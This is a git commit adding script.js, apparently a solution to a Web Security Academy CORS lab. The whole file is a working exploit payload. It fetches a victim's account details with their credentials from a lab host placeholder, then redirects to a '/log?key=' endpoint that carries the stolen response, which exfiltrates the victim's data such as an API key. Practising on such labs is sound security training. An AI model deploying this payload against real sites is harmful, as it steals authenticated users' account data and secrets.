b840d01e92262e1b183551606df2b052cfef1daa
rickymai2801 <147476925+rickymai2801@users.noreply.github.com>
2024-04-27 14:44:03 +1000

    Create script.js

---
+++ script.js
@@ -0,0 +1,11 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
